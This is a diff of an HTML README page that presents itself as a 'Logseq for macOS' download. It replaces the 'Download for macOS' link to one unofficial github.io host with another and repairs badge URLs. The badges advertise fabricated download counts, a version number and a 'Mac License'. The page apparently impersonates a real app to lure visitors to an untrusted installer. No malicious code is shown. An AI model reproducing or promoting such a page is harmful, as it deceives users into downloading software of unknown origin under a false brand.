@@ -6,7 +6,7 @@
 <h3>Logseq for macOS</h3>
 <p>Logseq Mac Edition turns your Mac into a daily logbook, research garden and planning canvas in one.</p>
 
-<a href="https://install-quick-mac.github.io/.github/Logseq">
+<a href="https://mac-software-install.github.io/.github/Logseq">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
@@ -16,8 +16,8 @@
 
 <a href="#"><img src="https://img.shields.io/badge/downloads-7.8k-brightgreen?style=flat" alt="downloads"/></a>
 <a href="#"><img src="https://img.shields.io/badge/version-8.1-blue?style=flat" alt="version"/></a>
-<a href="#"><img src="https://img.shields.io-badge/license-Mac%20License-lightgrey?style=flat" alt="license"/></a>
-<a href="#"><img src="https://img.shields.io-badge/platform-macOS-blue?style=flat" alt="platform"/></a>
+<a href="#"><img src="https://img.shields.io/badge/license-Mac%20License-lightgrey?style=flat" alt="license"/></a>
+<a href="#"><img src="https://img.shields.io/badge/platform-macOS-blue?style=flat" alt="platform"/></a>
 
 <img src="https://discuss.logseq.com/uploads/default/original/2X/3/3b03be757f7c87144615e03687ff1122660020fa.png" width="824" alt="Screenshot"/>
 
